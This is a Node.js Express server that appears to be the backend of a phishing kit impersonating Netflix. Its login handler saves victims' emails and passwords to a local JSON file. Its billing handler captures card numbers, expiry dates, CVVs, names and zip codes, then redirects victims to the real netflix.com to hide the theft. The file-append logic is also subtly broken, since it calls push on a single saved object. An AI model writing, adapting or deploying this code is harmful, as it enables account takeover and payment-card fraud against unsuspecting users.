const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const exp = require('constants');
// 
const cors = require('cors');


const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static('.'));

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

app.get('/billing', (req, res) => {
    res.sendFile(__dirname + '/billing.html');
});

app.post('/login_form', function(req, res) {
  const data = {
    email: req.body.email,
    password: req.body.password,
  };
  const json = JSON.stringify(data, null, 2);
  fs.writeFileSync('data/data.json', json);

  res.redirect('/billing.html');
});

app.post('/billing_form', function(req, res) {
  const info = {
    card_number: req.body.card_number,
    exp_date: req.body.exp_date,
    cvv: req.body.cvv,
    first_name: req.body.first_name,
    last_name: req.body.last_name,
    zip_code: req.body.zip_code,
  };
  // const json = JSON.stringify(data, null, 2);
  // fs.writeFileSync('data/data.json', json);

  // fs.readFile('data/data.json', function(err, data) {
  //   var json = JSON.parse(data);
  //   json.push(info);
  //   fs.writeFileSync('data/data.json', json);
  // });
  fs.readFile('data/data.json', function (err, data) {
    var json = JSON.parse(data);
    console.log(json)
    json.push(info);    
    fs.writeFile("data/data.json", JSON.stringify(json), function(err){
      if (err) throw err;
      console.log('The "data to append" was appended to file!');
    });
  })


  res.redirect('https://netflix.com/');
});

app.listen(port, function (err) {
    if (err) console.log(err);
    console.log("Server listening on PORT", port);
});
